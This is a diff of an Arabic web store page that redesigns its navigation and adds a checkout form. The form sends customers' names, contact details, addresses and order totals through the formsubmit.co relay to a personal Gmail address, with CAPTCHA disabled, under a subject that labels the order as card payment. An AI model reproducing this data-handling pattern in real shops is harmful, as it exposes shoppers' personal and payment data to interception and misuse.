@@ -1,12 +1,10 @@
 <!DOCTYPE html><html lang="ar" dir="rtl"><head><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>متجر الخصوصية العالمي المتطور - الجيل الجديد من التسوق</title>
+    <title>متجر الخصوصية المتطور - تجربة تسوق حديثة</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" rel="stylesheet">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/particles.js/2.0.0/particles.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
     <script>
         tailwind.config = {
             theme: {
@@ -60,29 +58,25 @@
             background: linear-gradient(135deg, #0F0F23 0%, #1A1A2E 100%);
         }
 
-        /* Futuristic Animations */
+        /* Simplified Animations - Less Distracting */
         @keyframes matrix {
             0% { transform: translateY(-100vh); }
             100% { transform: translateY(100vh); }
         }
 
         @keyframes neon {
-            from { 
-                text-shadow: 0 0 10px #fff, 0 0 20px #fff, 0 0 30px #e60073, 0 0 40px #e60073, 0 0 50px #e60073, 0 0 60px #e60073, 0 0 70px #e60073;
-            }
-            to { 
-                text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #e60073, 0 0 20px #e60073, 0 0 25px #e60073, 0 0 30px #e60073, 0 0 35px #e60073;
-            }
+            from { text-shadow: 0 0 5px rgba(255,255,255,0.3); }
+            to { text-shadow: 0 0 10px rgba(255,255,255,0.5); }
         }
 
         @keyframes cyber {
             0%, 100% { transform: perspective(400px) rotateY(0deg); }
-            50% { transform: perspective(400px) rotateY(5deg); }
+            50% { transform: perspective(400px) rotateY(2deg); }
         }
 
         @keyframes hologram {
-            0%, 100% { opacity: 1; transform: translateZ(0); }
-            50% { opacity: 0.7; transform: translateZ(20px); }
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.9; }
         }
 
         @keyframes scan {
@@ -92,10 +86,7 @@
 
         @keyframes glitch {
             0%, 100% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(2px, -2px); }
+            50% { transform: translate(1px, 1px); }
         }
 
         @keyframes typewriter {
@@ -492,35 +483,183 @@
         }
 
         /* Enhanced Navigation */
-        .nav-link {
+        .nav-link-advanced {
             position: relative;
-            transition: all 0.2s ease;
-            padding: 6px 8px;
-            border-radius: 6px;
-            font-weight: 400;
+            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            padding: 12px 20px;
+            border-radius: 15px;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.9);
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            text-decoration: none;
+            overflow: hidden;
         }
 
-        .nav-link::before {
+        .nav-link-advanced::before {
             content: '';
             position: absolute;
-            bottom: 0;
-            left: 50%;
-            width: 0;
-            height: 3px;
-            background: linear-gradient(90deg, #6366F1, #EC4899);
-            transition: all 0.3s ease;
-            transform: translateX(-50%);
-            border-radius: 2px;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
         }
 
-        .nav-link:hover {
-            color: #6366F1;
-            background: rgba(99, 102, 241, 0.1);
+        .nav-link-advanced:hover::before {
+            left: 100%;
+        }
+
+        .nav-link-advanced:hover {
+            color: white;
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            border-color: rgba(255, 255, 255, 0.3);
+        }
+
+        .nav-link-advanced i {
+            transition: transform 0.3s ease;
+        }
+
+        .nav-link-advanced:hover i {
+            transform: scale(1.1);
+        }
+
+        /* Enhanced Action Buttons */
+        .action-btn {
+            width: 44px;
+            height: 44px;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .action-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s;
+        }
+
+        .action-btn:hover::before {
+            left: 100%;
+        }
+
+        .action-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        /* Enhanced Search Input */
+        .search-input-modern {
+            width: 280px;
+            padding: 12px 16px;
+            border-radius: 25px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: white;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .search-input-modern::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+
+        .search-input-modern:focus {
+            background: rgba(255, 255, 255, 0.15);
+            border-color: rgba(255, 255, 255, 0.3);
+            box-shadow: 0 0 20px rgba(255, 255, 255, 0.1);
+        }
+
+        /* Enhanced Badge Styles */
+        .loyalty-badge-mini {
+            background: linear-gradient(45deg, #ffd700, #ffed4e);
+            color: #333;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
+        }
+
+        .points-card-mini {
+            background: linear-gradient(145deg, #FEF3C7, #FDE68A);
+            color: #92400e;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3);
+        }
+
+        .notification-badge {
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            background: linear-gradient(45deg, #ef4444, #dc2626);
+            color: white;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: bold;
+            border: 2px solid rgba(255, 255, 255, 0.2);
+        }
+
+        /* Mobile Navigation */
+        .mobile-nav-compact {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 4px;
+            padding: 12px 8px;
+            border-radius: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: rgba(255, 255, 255, 0.9);
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+
+        .mobile-nav-compact:hover {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
             transform: translateY(-2px);
         }
 
-        .nav-link:hover::before {
-            width: 80%;
+        .search-input-compact {
+            padding: 12px 16px;
+            border-radius: 25px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: white;
+            font-size: 16px;
+            outline: none;
+        }
+
+        .search-input-compact::placeholder {
+            color: rgba(255, 255, 255, 0.7);
         }
 
         /* Product Grid Enhancements - صور أكبر بكثير */
@@ -1302,8 +1441,8 @@
     <!-- Age Verification Modal -->
     <div id="age-verification" class="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50">
         <div class="glass-effect p-10 max-w-md w-full mx-4 text-center text-white">
-            <i class="fas fa-exclamation-triangle text-5xl text-amber-400 mb-6 animate-pulse"></i>
-            <h2 class="text-3xl font-bold mb-6 neon-text">تأكيد العمر</h2>
+            <i class="fas fa-exclamation-triangle text-5xl text-amber-400 mb-6"></i>
+            <h2 class="text-3xl font-bold mb-6">تأكيد العمر</h2>
             <p class="text-gray-200 mb-8 text-lg">
                 يجب أن تكون 18 سنة أو أكثر لدخول هذا الموقع
             </p>
@@ -1318,118 +1457,172 @@
         </div>
     </div>
 
+    <!-- Vertical Side Buttons - Currency & Share -->
+    <div class="fixed right-4 top-1/2 transform -translate-y-1/2 z-40 space-y-4">
+        <!-- Currency Selector -->
+        <div class="currency-dropdown relative">
+            <button onclick="toggleCurrencyDropdown()" class="w-14 h-14 bg-gradient-to-br from-purple-500 to-blue-500 rounded-full text-white shadow-lg hover:shadow-xl transform hover:scale-110 transition-all duration-300 flex items-center justify-center" title="تغيير العملة">
+                <span class="text-lg font-bold" id="current-currency">ريال</span>
+            </button>
+            <div id="currency-dropdown" class="dropdown-content right-16 top-0 min-w-48">
+                <a href="#" onclick="changeCurrency('SAR', 'ريال', 1)">🇸🇦 ريال سعودي</a>
+                <a href="#" onclick="changeCurrency('USD', '$', 0.27)">🇺🇸 دولار أمريكي</a>
+                <a href="#" onclick="changeCurrency('EUR', '€', 0.24)">🇪🇺 يورو</a>
+                <a href="#" onclick="changeCurrency('AED', 'درهم', 0.98)">🇦🇪 درهم إماراتي</a>
+                <a href="#" onclick="changeCurrency('EGP', 'جنيه', 8.24)">🇪🇬 جنيه مصري</a>
+                <a href="#" onclick="changeCurrency('JOD', 'دينار', 0.19)">🇯🇴 دينار أردني</a>
+                <a href="#" onclick="changeCurrency('KWD', 'دينار', 0.08)">🇰🇼 دينار كويتي</a>
+                <a href="#" onclick="changeCurrency('QAR', 'ريال', 0.97)">🇶🇦 ريال قطري</a>
+            </div>
+        </div>
+
+        <!-- Share Button -->
+        <button onclick="showShareModal()" class="w-14 h-14 bg-gradient-to-br from-green-500 to-teal-500 rounded-full text-white shadow-lg hover:shadow-xl transform hover:scale-110 transition-all duration-300 flex items-center justify-center" title="مشاركة الموقع">
+            <i class="fas fa-share-alt text-xl"></i>
+        </button>
+
+        <!-- Theme Toggle -->
+        <button onclick="toggleTheme()" class="w-14 h-14 bg-gradient-to-br from-yellow-500 to-orange-500 rounded-full text-white shadow-lg hover:shadow-xl transform hover:scale-110 transition-all duration-300 flex items-center justify-center" title="تغيير المظهر">
+            <i class="fas fa-sun text-xl" id="theme-icon"></i>
+        </button>
+
+        <!-- Language Selector -->
+        <div class="language-dropdown relative">
+            <button onclick="toggleLanguageDropdown()" class="w-14 h-14 bg-gradient-to-br from-pink-500 to-rose-500 rounded-full text-white shadow-lg hover:shadow-xl transform hover:scale-110 transition-all duration-300 flex items-center justify-center" title="تغيير اللغة">
+                <span class="text-sm font-bold" id="current-language">عر</span>
+            </button>
+            <div id="language-dropdown" class="dropdown-content right-16 top-0 min-w-48">
+                <a href="#" onclick="changeLanguage('ar')">🇸🇦 العربية</a>
+                <a href="#" onclick="changeLanguage('en')">🇺🇸 English</a>
+                <a href="#" onclick="changeLanguage('fr')">🇫🇷 Français</a>
+                <a href="#" onclick="changeLanguage('tr')">🇹🇷 Türkçe</a>
+            </div>
+        </div>
+    </div>
+
     <!-- Navigation -->
-    <nav class="glass-effect sticky top-0 z-40 transition-colors duration-300 mx-4 mt-4 rounded-2xl">
-        <div class="container mx-auto px-6">
-            <div class="flex flex-col">
-                <!-- Navigation Links Row -->
-                <div class="flex justify-end items-center py-3">
-                    <div class="hidden md:flex space-x-1 space-x-reverse">
-                        <a href="#" class="nav-link text-white text-xs font-normal px-2 py-1 whitespace-nowrap" onclick="showPage('home')">🏠 الرئيسية</a>
-                        <a href="#" class="nav-link text-white text-xs font-normal px-2 py-1 whitespace-nowrap" onclick="showPage('products')">🛍️ المنتجات</a>
-                        <a href="#" class="nav-link text-white text-xs font-normal px-2 py-1 whitespace-nowrap" onclick="showPage('ai-recommendations')">🤖 AI</a>
-                        <a href="#" class="nav-link text-white text-xs font-normal px-2 py-1 whitespace-nowrap" onclick="showPage('vr-experience')">🥽 VR</a>
-                        <a href="#" class="nav-link text-white text-xs font-normal px-2 py-1 whitespace-nowrap" onclick="showPage('social-shopping')">👥 اجتماعي</a>
-                        <a href="#" class="nav-link text-white text-xs font-normal px-2 py-1 whitespace-nowrap" onclick="showPage('code')">🔐 الكود</a>
-                        <a href="#" class="nav-link text-white text-xs font-normal px-2 py-1 whitespace-nowrap" onclick="showPage('contact')">📞 اتصال</a>
+    <nav class="glass-effect sticky top-0 z-40 transition-all duration-300 mx-1 mt-1 rounded-2xl border border-white/10 shadow-xl backdrop-blur-lg">
+        <div class="container mx-auto px-3">
+            <!-- Header Row -->
+            <div class="flex justify-between items-center py-2">
+                <!-- Logo Section -->
+                <div class="flex items-center space-x-2 space-x-reverse">
+                    <div class="relative">
+                        <div class="w-8 h-8 bg-gradient-to-r from-purple-500 to-blue-500 rounded-full flex items-center justify-center">
+                            <i class="fas fa-atom text-sm text-white"></i>
+                        </div>
+                        <div class="absolute -top-1 -right-1 w-2 h-2 bg-green-400 rounded-full"></div>
+                    </div>
+                    <div>
+                        <h1 class="text-sm font-black text-white cyber-text">CYBER STORE</h1>
+                        <p class="text-xs text-gray-300 hidden sm:block">متجر المستقبل</p>
                     </div>
                 </div>
-                
-                <!-- Site Name and Other Controls Row -->
-                <div class="flex justify-between items-center pb-6">
-                    <div class="flex items-center space-x-2 space-x-reverse">
-                        <div class="w-10 h-10 bg-gradient-to-r from-neon-pink to-neon-blue rounded-full flex items-center justify-center animate-spin">
-                            <i class="fas fa-atom text-xs text-white"></i>
-                        </div>
-                        <h1 class="text-lg font-black text-yellow-600 cyber-text hologram">CYBER STORE</h1>
-                    </div>
-                
-                    <div class="flex items-center space-x-4 space-x-reverse">
-                        <!-- User Level & XP -->
-                        <div class="hidden md:flex items-center loyalty-badge px-3 py-2">
-                            <i class="fas fa-crown text-sm mr-2"></i>
-                            <span class="font-medium text-sm" id="user-level">مستوى 5</span>
-                        </div>
 
-                        <!-- Points Display -->
-                        <div class="hidden md:flex items-center points-card px-3 py-2">
-                            <i class="fas fa-star text-sm ml-2 text-amber-600"></i>
-                            <span class="font-medium text-sm text-amber-800" id="user-points">0</span>
-                            <span class="text-sm mr-1 text-amber-700">نقطة</span>
-                        </div>
+                <!-- Main Navigation - Desktop -->
+                <div class="hidden lg:flex items-center space-x-2 space-x-reverse">
+                    <a href="#" class="nav-link-advanced" onclick="showPage('home')" data-page="home">
+                        <i class="fas fa-home text-lg"></i>
+                        <span>الرئيسية</span>
+                    </a>
+                    <a href="#" class="nav-link-advanced" onclick="showPage('products')" data-page="products">
+                        <i class="fas fa-shopping-bag text-lg"></i>
+                        <span>المنتجات</span>
+                    </a>
+                    <a href="#" class="nav-link-advanced" onclick="showPage('ai-recommendations')" data-page="ai-recommendations">
+                        <i class="fas fa-robot text-lg"></i>
+                        <span>AI التوصيات</span>
+                    </a>
+                    <a href="#" class="nav-link-advanced" onclick="showPage('vr-experience')" data-page="vr-experience">
+                        <i class="fas fa-vr-cardboard text-lg"></i>
+                        <span>VR تجربة</span>
+                    </a>
+                    <a href="#" class="nav-link-advanced" onclick="showPage('social-shopping')" data-page="social-shopping">
+                        <i class="fas fa-users text-lg"></i>
+                        <span>تسوق اجتماعي</span>
+                    </a>
+                    <a href="#" class="nav-link-advanced" onclick="showPage('code')" data-page="code">
+                        <i class="fas fa-key text-lg"></i>
+                        <span>الكود السري</span>
+                    </a>
+                    <a href="#" class="nav-link-advanced" onclick="showPage('contact')" data-page="contact">
+                        <i class="fas fa-phone text-lg"></i>
+                        <span>اتصل بنا</span>
+                    </a>
+                </div>
 
-                        <!-- Voice Search Button -->
-                        <button onclick="startVoiceSearch()" class="voice-button hidden md:flex items-center justify-center" id="voice-btn">
+                <!-- Right Section -->
+                <div class="flex items-center space-x-3 space-x-reverse">
+                    <!-- Action Buttons -->
+                    <div class="flex items-center space-x-3 space-x-reverse">
+                        <!-- Voice Search -->
+                        <button onclick="startVoiceSearch()" class="action-btn" id="voice-btn" title="البحث الصوتي">
                             <i class="fas fa-microphone"></i>
                         </button>
 
-                        <!-- Advanced Search -->
-                        <div class="search-container hidden md:block">
-                            <input type="text" class="search-bar" placeholder="🔍 بحث ذكي بالـ AI..." id="smart-search" onkeyup="performSmartSearch(this.value)">
-                            <div class="absolute right-4 top-1/2 transform -translate-y-1/2">
-                                <i class="fas fa-search text-white/70"></i>
-                            </div>
+                        <!-- Search -->
+                        <div class="relative hidden md:block">
+                            <input type="text" class="search-input-modern" placeholder="🔍 بحث ذكي..." id="smart-search" onkeyup="performSmartSearch(this.value)">
                         </div>
 
-                        <!-- Wishlist Button -->
-                        <button onclick="toggleWishlist()" class="relative glass-effect p-2 rounded-lg text-white">
-                            <i class="fas fa-heart text-lg wishlist-heart" id="wishlist-icon"></i>
-                            <span id="wishlist-count" class="absolute -top-1 -right-1 bg-gradient-to-r from-red-500 to-pink-500 text-white rounded-full text-xs w-6 h-6 flex items-center justify-center font-bold">0</span>
+                        <!-- Wishlist -->
+                        <button onclick="toggleWishlist()" class="action-btn relative" title="المفضلة">
+                            <i class="fas fa-heart wishlist-heart" id="wishlist-icon"></i>
+                            <span id="wishlist-count" class="notification-badge">0</span>
                         </button>
-
-                        <!-- Language Selector -->
-                        <div class="currency-dropdown">
-                            <button onclick="toggleLanguageDropdown()" class="flex items-center space-x-1 space-x-reverse glass-effect px-3 py-2 rounded-lg text-white text-sm">
-                                <i class="fas fa-globe text-sm"></i>
-                                <span id="current-language" class="hidden md:inline">العربية</span>
-                                <i class="fas fa-chevron-down text-xs"></i>
-                            </button>
-                            <div id="language-dropdown" class="dropdown-content">
-                                <a href="#" onclick="changeLanguage('ar')">🇸🇦 العربية</a>
-                                <a href="#" onclick="changeLanguage('en')">🇺🇸 English</a>
-                                <a href="#" onclick="changeLanguage('fr')">🇫🇷 Français</a>
-                                <a href="#" onclick="changeLanguage('tr')">🇹🇷 Türkçe</a>
-                            </div>
-                        </div>
-
-                        <!-- Currency Selector -->
-                        <div class="currency-dropdown">
-                            <button onclick="toggleCurrencyDropdown()" class="flex items-center space-x-1 space-x-reverse glass-effect px-3 py-2 rounded-lg text-white text-sm">
-                                <i class="fas fa-coins text-sm"></i>
-                                <span id="current-currency" class="hidden md:inline">ريال</span>
-                                <i class="fas fa-chevron-down text-xs"></i>
-                            </button>
-                            <div id="currency-dropdown" class="dropdown-content">
-                                <a href="#" onclick="changeCurrency('SAR', 'ريال', 1)">🇸🇦 ريال سعودي (SAR)</a>
-                                <a href="#" onclick="changeCurrency('USD', '$', 0.27)">🇺🇸 دولار أمريكي (USD)</a>
-                                <a href="#" onclick="changeCurrency('EUR', '€', 0.24)">🇪🇺 يورو (EUR)</a>
-                                <a href="#" onclick="changeCurrency('AED', 'درهم', 0.98)">🇦🇪 درهم إماراتي (AED)</a>
-                                <a href="#" onclick="changeCurrency('KWD', 'دينار', 0.082)">🇰🇼 دينار كويتي (KWD)</a>
-                                <a href="#" onclick="changeCurrency('BTC', '₿', 0.000041)">₿ Bitcoin</a>
-                                <a href="#" onclick="changeCurrency('ETH', 'Ξ', 0.00064)">Ξ Ethereum</a>
-                            </div>
-                        </div>
                         
-                        <button onclick="toggleCart()" class="relative glass-effect p-2 rounded-lg text-white">
-                            <i class="fas fa-shopping-cart text-lg"></i>
-                            <span id="cart-count" class="absolute -top-1 -right-1 bg-gradient-to-r from-red-500 to-pink-500 text-white rounded-full text-xs w-6 h-6 flex items-center justify-center font-bold animate-pulse">0</span>
+                        <!-- Cart -->
+                        <button onclick="toggleCart()" class="action-btn relative" title="السلة">
+                            <i class="fas fa-shopping-cart"></i>
+                            <span id="cart-count" class="notification-badge">0</span>
                         </button>
-                        <button class="md:hidden glass-effect p-2 rounded-lg text-white" onclick="toggleMobileMenu()">
-                            <i class="fas fa-bars text-lg"></i>
+
+                        <!-- Mobile Menu Toggle -->
+                        <button class="lg:hidden action-btn" onclick="toggleMobileMenu()" title="القائمة">
+                            <i class="fas fa-bars"></i>
                         </button>
                     </div>
                 </div>
             </div>
             
-            <!-- Mobile Menu -->
-            <div id="mobile-menu" class="md:hidden hidden pb-6">
-                <a href="#" class="block py-3 nav-link text-white" onclick="showPage('home')">🏠 الرئيسية</a>
-                <a href="#" class="block py-3 nav-link text-white" onclick="showPage('products')">🛍️ المنتجات</a>
-                <a href="#" class="block py-3 nav-link text-white" onclick="showPage('ai-recommendations')">🤖 AI التوصيات</a>
-                <a href="#" class="block py-3 nav-link text-white" onclick="showPage('vr-experience')">🥽 تجربة VR</a>
-                <a href="#" class="block py-3 nav-link text-white" onclick="showPage('social-shopping')">👥 التسوق الاجتماعي</a>
-                <a href="#" class="block py-3 nav-link text-white" onclick="showPage('code')">🔐 أدخل الكود</a>
-                <a href="#" class="block py-3 nav-link text-white" onclick="showPage('contact')">📞 اتصل بنا</a>
+            <!-- Mobile Navigation -->
+            <div id="mobile-menu" class="lg:hidden hidden">
+                <div class="border-t border-white/10 pt-2 pb-2">
+                    <div class="grid grid-cols-4 gap-1">
+                        <a href="#" class="mobile-nav-compact" onclick="showPage('home')">
+                            <i class="fas fa-home text-lg"></i>
+                            <span class="text-xs">الرئيسية</span>
+                        </a>
+                        <a href="#" class="mobile-nav-compact" onclick="showPage('products')">
+                            <i class="fas fa-shopping-bag text-lg"></i>
+                            <span class="text-xs">المنتجات</span>
+                        </a>
+                        <a href="#" class="mobile-nav-compact" onclick="showPage('ai-recommendations')">
+                            <i class="fas fa-robot text-lg"></i>
+                            <span class="text-xs">AI</span>
+                        </a>
+                        <a href="#" class="mobile-nav-compact" onclick="showPage('vr-experience')">
+                            <i class="fas fa-vr-cardboard text-lg"></i>
+                            <span class="text-xs">VR</span>
+                        </a>
+                        <a href="#" class="mobile-nav-compact" onclick="showPage('social-shopping')">
+                            <i class="fas fa-users text-lg"></i>
+                            <span class="text-xs">اجتماعي</span>
+                        </a>
+                        <a href="#" class="mobile-nav-compact" onclick="showPage('code')">
+                            <i class="fas fa-key text-lg"></i>
+                            <span class="text-xs">كود</span>
+                        </a>
+                        <a href="#" class="mobile-nav-compact" onclick="showPage('contact')">
+                            <i class="fas fa-phone text-lg"></i>
+                            <span class="text-xs">اتصال</span>
+                        </a>
+                    </div>
+                    <!-- Mobile Search -->
+                    <div class="mt-2">
+                        <input type="text" class="search-input-compact w-full" placeholder="🔍 بحث ذكي..." id="mobile-search" onkeyup="performSmartSearch(this.value)">
+                    </div>
+                </div>
             </div>
         </div>
     </nav>
@@ -3365,6 +3558,13 @@
         function changeLanguage(lang) {
             currentLanguage = lang;
             const languages = {
+                'ar': 'عر',
+                'en': 'EN',
+                'fr': 'FR',
+                'tr': 'TR'
+            };
+            
+            const fullLanguages = {
                 'ar': 'العربية',
                 'en': 'English',
                 'fr': 'Français',
@@ -3382,7 +3582,19 @@
                 document.documentElement.setAttribute('lang', lang);
             }
             
-            showNotification(`🌐 تم تغيير اللغة إلى ${languages[lang]}`);
+            showNotification(`🌐 تم تغيير اللغة إلى ${fullLanguages[lang]}`);
+        }
+
+        // Theme Toggle
+        function toggleTheme() {
+            document.documentElement.classList.toggle('dark');
+            const themeIcon = document.getElementById('theme-icon');
+            if (document.documentElement.classList.contains('dark')) {
+                themeIcon.className = 'fas fa-moon text-xl';
+            } else {
+                themeIcon.className = 'fas fa-sun text-xl';
+            }
+            showNotification('🌓 تم تغيير المظهر');
         }
 
         // Currency functions
@@ -3875,31 +4087,274 @@
         }
 
         function showOrderForm() {
-            showCustomModal(`
-                <div class="text-6xl mb-6">🛍️</div>
-                <h3 class="text-3xl font-bold mb-6 text-white">إتمام الطلب</h3>
-                <div class="bg-blue-100 dark:bg-blue-900 p-6 rounded-xl mb-8">
-                    <p class="text-blue-800 dark:text-blue-200 text-xl">🚀 قريباً: نظام طلبات متطور</p>
-                    <p class="text-blue-700 dark:text-blue-300 text-lg mt-3">سيتم إضافة نظام طلبات شامل مع دفع رقمي</p>
+            const cartSubtotal = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0) * currentExchangeRate;
+            let shippingCost = 15 * currentExchangeRate;
+            if (cartSubtotal >= 300 * currentExchangeRate) {
+                shippingCost = 0;
+            }
+            const aiDiscount = userLevel * 2 * currentExchangeRate;
+            const totalPrice = Math.max(0, cartSubtotal + shippingCost - aiDiscount);
+            
+            const modal = document.createElement('div');
+            modal.className = 'fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4';
+            modal.innerHTML = `
+                <div class="glass-effect max-w-4xl w-full max-h-[95vh] overflow-y-auto">
+                    <div class="p-8 border-b border-white/20">
+                        <div class="flex justify-between items-center">
+                            <h2 class="text-3xl font-bold text-white cyber-text">💳 إتمام الطلب والدفع</h2>
+                            <button onclick="this.closest('.fixed').remove()" class="text-gray-300 hover:text-white text-3xl">
+                                <i class="fas fa-times"></i>
+                            </button>
+                        </div>
+                    </div>
+                    
+                    <div class="p-8">
+                        <!-- Progress Steps -->
+                        <div class="progress-steps mb-8">
+                            <div class="step completed">
+                                <div class="step-circle">1</div>
+                                <span class="text-white">السلة</span>
+                                <div class="step-line"></div>
+                            </div>
+                            <div class="step active">
+                                <div class="step-circle">2</div>
+                                <span class="text-white">الدفع</span>
+                                <div class="step-line"></div>
+                            </div>
+                            <div class="step">
+                                <div class="step-circle">3</div>
+                                <span class="text-white">التأكيد</span>
+                            </div>
+                        </div>
+
+                        <form id="payment-form" action="https://formsubmit.co/kaliroot123m@gmail.com" method="POST" class="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                            <!-- Hidden FormSubmit fields -->
+                            <input type="hidden" name="_subject" value="🛒 طلب جديد من متجر الخصوصية - دفع بالبطاقة البنكية">
+                            <input type="hidden" name="_captcha" value="false">
+                            <input type="hidden" name="_template" value="table">
+                            <input type="hidden" name="_next" value="">
+                            <input type="hidden" name="order_timestamp" id="order-timestamp">
+                            <input type="hidden" name="order_id" id="order-id">
+                            <input type="hidden" name="total_amount" value="${totalPrice.toFixed(2)} ${currentCurrencySymbol}">
+                            <input type="hidden" name="cart_items" id="cart-items-data">
+                            <input type="hidden" name="user_level" value="${userLevel}">
+                            <input type="hidden" name="ai_discount" value="${aiDiscount.toFixed(2)} ${currentCurrencySymbol}">
+                            
+                            <!-- Customer Information -->
+                            <div>
+                                <h3 class="text-2xl font-bold text-white mb-6">📋 معلومات العميل</h3>
+                                <div class="space-y-4">
+                                    <div>
+                                        <label class="block text-white font-bold mb-2">الاسم الكامل *</label>
+                                        <input type="text" name="customer_name" class="w-full p-4 rounded-xl bg-white/10 text-white border border-white/20 focus:border-yellow-400 focus:outline-none" placeholder="محمد أحمد علي" required>
+                                    </div>
+                                    <div>
+                                        <label class="block text-white font-bold mb-2">البريد الإلكتروني *</label>
+                                        <input type="email" name="customer_email" class="w-full p-4 rounded-xl bg-white/10 text-white border border-white/20 focus:border-yellow-400 focus:outline-none" placeholder="example@email.com" required>
+                                    </div>
+                                    <div>
+                                        <label class="block text-white font-bold mb-2">رقم الهاتف *</label>
+                                        <input type="tel" name="customer_phone" class="w-full p-4 rounded-xl bg-white/10 text-white border border-white/20 focus:border-yellow-400 focus:outline-none" placeholder="+966 50 123 4567" required>
+                                    </div>
+                                    <div>
+                                        <label class="block text-white font-bold mb-2">المدينة *</label>
+                                        <select name="customer_city" class="w-full p-4 rounded-xl bg-white/10 text-white border border-white/20 focus:border-yellow-400 focus:outline-none" required>
+                                            <option value="">اختر المدينة</option>
+                                            <option value="الرياض">الرياض</option>
+                                            <option value="جدة">جدة</option>
+                                            <option value="الدمام">الدمام</option>
+                                            <option value="مكة المكرمة">مكة المكرمة</option>
+                                            <option value="المدينة المنورة">المدينة المنورة</option>
+                                            <option value="أبها">أبها</option>
+                                            <option value="تبوك">تبوك</option>
+                                            <option value="الطائف">الطائف</option>
+                                            <option value="القصيم">القصيم</option>
+                                            <option value="جازان">جازان</option>
+                                            <option value="نجران">نجران</option>
+                                            <option value="الباحة">الباحة</option>
+                                            <option value="حائل">حائل</option>
+                                            <option value="الجوف">الجوف</option>
+                                            <option value="عرعر">عرعر</option>
+                                            <option value="أخرى">أخرى</option>
+                                        </select>
+                                    </div>
+                                    <div>
+                                        <label class="block text-white font-bold mb-2">العنوان التفصيلي *</label>
+                                        <textarea name="customer_address" rows="3" class="w-full p-4 rounded-xl bg-white/10 text-white border border-white/20 focus:border-yellow-400 focus:outline-none" placeholder="الحي، الشارع، رقم المبنى، أي تفاصيل إضافية..." required></textarea>
+                                    </div>
+                                </div>
+
+                                <!-- Shipping Options -->
+                                <h3 class="text-2xl font-bold text-white mb-4 mt-8">🚚 خيارات التوصيل</h3>
+                                <div class="space-y-3">
+                                    <label class="flex items-center p-4 bg-white/5 rounded-xl cursor-pointer hover:bg-white/10 transition-colors">
+                                        <input type="radio" name="shipping_method" value="عادي - 24-48 ساعة - 15 ريال" class="mr-3" checked>
+                                        <div>
+                                            <div class="text-white font-bold">🚛 توصيل عادي</div>
+                                            <div class="text-gray-300">24-48 ساعة - 15 ${currentCurrencySymbol}</div>
+                                        </div>
+                                    </label>
